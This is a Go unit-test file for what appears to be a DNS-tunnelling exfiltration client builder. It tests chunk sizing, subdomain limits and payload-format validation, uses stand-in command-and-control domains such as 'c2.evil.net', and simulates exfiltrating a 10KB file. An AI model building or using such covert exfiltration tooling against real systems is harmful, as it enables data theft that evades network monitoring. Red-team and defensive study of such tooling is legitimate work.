package main

import (
	"strings"
	"testing"
)

func TestChunkFitsBudget_NoSubdomainLimit(t *testing.T) {
	// With a 20-char domain and no subdomain limit, should allow reasonable chunks
	// Note: after AES-GCM + base36 encoding (with sentinel byte) + metadata label, ~79 bytes is the max for a 20-char domain
	if !chunkFitsBudget(50, 20, 0) {
		t.Error("50-byte chunk should fit with 20-char domain and no subdomain limit")
	}
	if !chunkFitsBudget(79, 20, 0) {
		t.Error("79-byte chunk should fit with 20-char domain and no subdomain limit")
	}
	if chunkFitsBudget(200, 20, 0) {
		t.Error("200-byte chunk should NOT fit with 20-char domain (exceeds 253 FQDN)")
	}
}

func TestChunkFitsBudget_WithSubdomainLimit(t *testing.T) {
	// With a subdomain limit, larger chunks should be rejected
	// Note: metadata label alone is ~60 chars, so subdomain limits must be > that
	domain := 12 // short domain like "c2.evil.net"

	// Find the max chunk that fits with no limit
	maxNoLimit := 0
	for c := 1; c <= 300; c++ {
		if chunkFitsBudget(c, domain, 0) {
			maxNoLimit = c
		}
	}

	// With 180-char subdomain limit (generous but less than unlimited)
	max180 := 0
	for c := 1; c <= 300; c++ {
		if chunkFitsBudget(c, domain, 180) {
			max180 = c
		}
	}

	// With 120-char subdomain limit (tighter)
	max120 := 0
	for c := 1; c <= 300; c++ {
		if chunkFitsBudget(c, domain, 120) {
			max120 = c
		}
	}

	// With 80-char subdomain limit (just above metadata overhead)
	max80 := 0
	for c := 1; c <= 300; c++ {
		if chunkFitsBudget(c, domain, 80) {
			max80 = c
		}
	}

	t.Logf("Max chunk bytes (domain=%d) - no limit: %d, 180-char: %d, 120-char: %d, 80-char: %d",
		domain, maxNoLimit, max180, max120, max80)

	if max180 >= maxNoLimit {
		t.Errorf("180-char subdomain limit should reduce max chunk: got %d vs unlimited %d", max180, maxNoLimit)
	}
	if max120 >= max180 {
		t.Errorf("120-char limit should reduce max chunk further: got %d vs 180-char %d", max120, max180)
	}
}

func TestMaxChunkBytesForDomains_NoLimit(t *testing.T) {
	domains := []string{"test.example.com"}
	max := maxChunkBytesForDomains(domains, 0)
	if max <= 0 {
		t.Fatal("Should return positive max chunk bytes for valid domain")
	}
	if max > 300 {
		t.Errorf("Max chunk bytes %d seems unreasonably large", max)
	}
	t.Logf("Max chunk bytes for 'test.example.com' with no limit: %d", max)
}

func TestMaxChunkBytesForDomains_WithLimit(t *testing.T) {
	// Metadata label is ~60 chars, so subdomain limits must be well above that to carry data
	domains := []string{"c2.evil.net"} // short domain

	maxNoLimit := maxChunkBytesForDomains(domains, 0)
	max200 := maxChunkBytesForDomains(domains, 200)
	max150 := maxChunkBytesForDomains(domains, 150)
	max100 := maxChunkBytesForDomains(domains, 100)

	t.Logf("Max chunk bytes for 'c2.evil.net': no-limit=%d, 200=%d, 150=%d, 100=%d",
		maxNoLimit, max200, max150, max100)

	if max200 >= maxNoLimit {
		t.Errorf("200-char limit should reduce max chunk: %d vs %d", max200, maxNoLimit)
	}
	if max150 >= max200 {
		t.Errorf("150-char limit should reduce further: %d vs %d", max150, max200)
	}
	if max100 >= max150 {
		t.Errorf("100-char limit should reduce further: %d vs %d", max100, max150)
	}
}

func TestMaxChunkBytesForDomains_LongDomain(t *testing.T) {
	domains := []string{"this.is.a.very.long.domain.name.example.com"}

	maxNoLimit := maxChunkBytesForDomains(domains, 0)
	max180 := maxChunkBytesForDomains(domains, 180)

	if maxNoLimit <= 0 {
		t.Error("Should still support some chunks with long domain")
	}

	t.Logf("Long domain max chunk: no-limit=%d, 180-char=%d", maxNoLimit, max180)

	if max180 > 0 && max180 >= maxNoLimit {
		t.Errorf("Subdomain limit should reduce max chunk: %d vs %d", max180, maxNoLimit)
	}
}

func TestMaxChunkBytesForDomains_EmptyDomains(t *testing.T) {
	max := maxChunkBytesForDomains([]string{}, 0)
	if max != 0 {
		t.Errorf("Empty domains should return 0, got %d", max)
	}
}

func TestMaxChunkBytesForDomains_SubdomainLimitProducesMoreQueries(t *testing.T) {
	// Simulate exfiltrating a 10KB file with different subdomain limits
	domains := []string{"c2.evil.net"}
	fileSize := 10240 // 10KB

	maxNoLimit := maxChunkBytesForDomains(domains, 0)
	max200 := maxChunkBytesForDomains(domains, 200)
	max150 := maxChunkBytesForDomains(domains, 150)

	if maxNoLimit == 0 || max200 == 0 || max150 == 0 {
		t.Fatalf("All should be >0: no-limit=%d, 200=%d, 150=%d", maxNoLimit, max200, max150)
	}

	queriesNoLimit := (fileSize + maxNoLimit - 1) / maxNoLimit
	queries200 := (fileSize + max200 - 1) / max200
	queries150 := (fileSize + max150 - 1) / max150

	if queries200 <= queriesNoLimit {
		t.Errorf("200-char limit should need more queries: %d vs %d", queries200, queriesNoLimit)
	}
	if queries150 <= queries200 {
		t.Errorf("150-char limit should need more queries: %d vs %d", queries150, queries200)
	}

	t.Logf("10KB exfil via 'c2.evil.net':")
	t.Logf("  No limit: %d bytes/query, %d queries", maxNoLimit, queriesNoLimit)
	t.Logf("  200-char: %d bytes/query, %d queries", max200, queries200)
	t.Logf("  150-char: %d bytes/query, %d queries", max150, queries150)
}

func TestClampExfilChunkBytes_SubdomainLimit(t *testing.T) {
	// Verify clampExfilChunkBytes respects MaxSubdomainLength
	req := &ExfilClientBuildRequest{
		Domains:            []string{"c2.evil.net"},
		ChunkBytes:         180, // default
		MaxSubdomainLength: 150, // limit that's below the no-limit max but above metadata overhead
	}

	before, limit := clampExfilChunkBytes(req)

	t.Logf("Before: %d, limit: %d, after clamp: %d", before, limit, req.ChunkBytes)

	if limit <= 0 {
		t.Fatal("Limit should be positive for valid domain + subdomain limit")
	}

	// The clamped value should be <= limit
	if req.ChunkBytes > limit {
		t.Errorf("ChunkBytes %d should be clamped to limit %d", req.ChunkBytes, limit)
	}

	// With 150-char subdomain limit, should be less than no-limit max
	noLimitMax := maxChunkBytesForDomains(req.Domains, 0)
	if limit >= noLimitMax {
		t.Errorf("150-char subdomain limit should produce smaller max (%d) than unlimited (%d)", limit, noLimitMax)
	}
}

// --- validatePayloadFormat tests ---

func validFormat(xSlots int) string {
	// Build a valid format with exactly xSlots X's in RFC 1035-safe labels (max 63 chars each).
	// Pattern: groups of 8 X + "-end" (12 chars), joined by dots.
	const xPerGroup = 8
	const decorator = "-end"
	groups := xSlots / xPerGroup
	rem := xSlots % xPerGroup
	var parts []string
	for i := 0; i < groups; i++ {
		parts = append(parts, strings.Repeat("X", xPerGroup)+decorator)
	}
	if rem > 0 {
		parts = append(parts, strings.Repeat("X", rem)+decorator)
	}
	return strings.Join(parts, ".")
}

func TestValidatePayloadFormat_Empty(t *testing.T) {
	// Empty format is always valid (default encoding)
	if err := validatePayloadFormat("", []string{"c2.test.com"}); err != nil {
		t.Errorf("empty format should be valid, got: %v", err)
	}
}

func TestValidatePayloadFormat_Valid(t *testing.T) {
	// A format with enough X slots and valid chars should pass
	format := validFormat(120)
	if err := validatePayloadFormat(format, []string{"c2.test.com"}); err != nil {
		t.Errorf("valid 120-slot format should pass, got: %v", err)
	}
}

func TestValidatePayloadFormat_InvalidChar(t *testing.T) {
	// Spaces and special characters are not DNS-safe
	format := validFormat(120)
	bad := format[:5] + " " + format[6:] // inject a space
	err := validatePayloadFormat(bad, []string{"c2.test.com"})
	if err == nil {
		t.Error("format with space should be rejected")
	}
}

func TestValidatePayloadFormat_FewSlots_Accepted(t *testing.T) {
	// Small formats are now valid — they apply to CHK beacons only and the client
	// falls back to default encoding for DATA chunks automatically.
	for _, slots := range []int{1, 20, 64, 32} {
		format := validFormat(slots)
		if err := validatePayloadFormat(format, []string{"c2.test.com"}); err != nil {
			t.Errorf("small format (%d slots) should now be accepted, got: %v", slots, err)
		}
	}
}

func TestValidatePayloadFormat_CHKOnlyThreshold(t *testing.T) {
	// CHK-only threshold: xSlots*5/8 - 63 < 1  →  xSlots < 103
	// Below 103 slots: format applies to CHK only (data falls back to default)
	// At or above 103 slots: format can carry at least 1 byte of data per chunk
	chkOnly := 100 // 100*5/8-63 = 62-63 = -1 → CHK only
	data1    := 104 // 104*5/8-63 = 65-63 = 2  → can carry 2 bytes

	if chkOnly*5/8-63 >= 1 {
		t.Errorf("slots=%d should be CHK-only (formatChunk < 1), got %d", chkOnly, chkOnly*5/8-63)
	}
	if data1*5/8-63 < 1 {
		t.Errorf("slots=%d should carry data (formatChunk >= 1), got %d", data1, data1*5/8-63)
	}
}

func TestValidatePayloadFormat_LabelTooLong(t *testing.T) {
	// A single label of 64 X's exceeds the DNS 63-char limit
	bad := strings.Repeat("X", 64) + ".rest-of-format"
	err := validatePayloadFormat(bad, []string{"c2.test.com"})
	if err == nil {
		t.Error("format with 64-char label should be rejected")
	}
}

func TestValidatePayloadFormat_EmptyLabel(t *testing.T) {
	// Consecutive dots produce an empty label
	bad := "XXXX..XXXX"
	err := validatePayloadFormat(bad, []string{"c2.test.com"})
	if err == nil {
		t.Error("format with consecutive dots (empty label) should be rejected")
	}
}

func TestValidatePayloadFormat_FQDNTooLong(t *testing.T) {
	// A very long format string that pushes the FQDN past 253 chars
	// format len + 1 + domain len > 253 → format len > 253 - 1 - len(domain)
	domain := "c2.example.com" // 14 chars
	// need format len > 253 - 1 - 14 = 238, so 239 chars of format
	// Build a valid format that is 240 chars long with enough X slots
	// Each group "XXXXXXXX-end." = 13 chars with 8 X slots
	// 240 chars / 13 chars per group ≈ 18 groups = 234 chars with 144 X slots — check exact
	longFormat := validFormat(200) // will be well over 238 chars given decorator overhead
	if len(longFormat)+1+len(domain) <= 253 {
		// Format not long enough for this domain; make it longer
		longFormat = strings.Repeat(validFormat(8)+".", 20) + validFormat(8)
	}
	if len(longFormat)+1+len(domain) <= 253 {
		t.Skipf("could not construct format long enough for this test (format=%d domain=%d)", len(longFormat), len(domain))
	}
	err := validatePayloadFormat(longFormat, []string{domain})
	if err == nil {
		t.Errorf("format that pushes FQDN past 253 chars should be rejected (format=%d domain=%d)", len(longFormat), len(domain))
	}
}

func TestValidatePayloadFormat_MultipleDomains_OneFails(t *testing.T) {
	// Format valid for short domain but too long for a long domain
	shortDomain := "c2.io"               // 5 chars
	longDomain := strings.Repeat("a", 100) + ".com" // 104 chars

	// We need a format where len(format)+1+5 ≤ 253 but len(format)+1+104 > 253
	// So: format len ≤ 247 and format len > 148 → e.g. 200 chars
	format := validFormat(120) // ~200 chars with decorators
	if len(format)+1+len(shortDomain) > 253 {
		t.Skipf("format too long for short domain test (%d chars)", len(format))
	}
	if len(format)+1+len(longDomain) <= 253 {
		t.Skipf("format not long enough to exceed limit with long domain (format=%d, domain=%d)", len(format), len(longDomain))
	}
	err := validatePayloadFormat(format, []string{shortDomain, longDomain})
	if err == nil {
		t.Error("should be rejected because one domain makes FQDN exceed 253 chars")
	}
}

func TestValidatePayloadFormat_AllowedDecorators(t *testing.T) {
	// Hyphens, underscores, and alphanumeric decorators are all valid.
	// Use 15 groups of "XXXXXXXX-ab_CD1" (8 X + 7 decorators = 15 chars each):
	//   15 groups × 15 chars + 14 dots = 239 chars, 120 X slots, fits "c2.test.com" FQDN (239+1+11=251 ≤ 253).
	group := "XXXXXXXX-ab_CD1"
	parts := make([]string, 15)
	for i := range parts {
		parts[i] = group
	}
	format := strings.Join(parts, ".")
	xSlots := strings.Count(format, "X")
	if xSlots < 114 {
		t.Skipf("test format only has %d X slots, need ≥114 — adjust test", xSlots)
	}
	if err := validatePayloadFormat(format, []string{"c2.test.com"}); err != nil {
		t.Errorf("format with valid decorator chars should pass, got: %v", err)
	}
}
